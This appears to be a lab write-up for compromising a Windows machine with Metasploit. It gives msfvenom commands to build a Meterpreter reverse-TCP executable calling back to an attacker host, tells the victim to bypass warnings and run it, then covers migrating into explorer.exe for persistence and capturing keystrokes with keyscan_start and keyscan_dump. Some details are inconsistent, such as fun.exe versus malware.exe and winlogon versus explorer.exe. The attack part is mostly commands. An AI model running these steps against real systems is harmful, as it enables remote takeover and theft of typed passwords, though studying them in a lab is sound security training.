Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > malware.exe

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![download](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/a6b73051-a143-4740-b3d9-27c23762218f)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![exploit](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/b46a08f7-a9fc-4e71-8fdd-170ee187dd22)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  â‡’ can see the fun.exe process running with pid 1156

![meterpreter-ps](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/7e6e28fb-b095-4fd1-81f8-a0292f82c9a2)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

keyscan_dump	Shows the keystrokes captured so far

## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
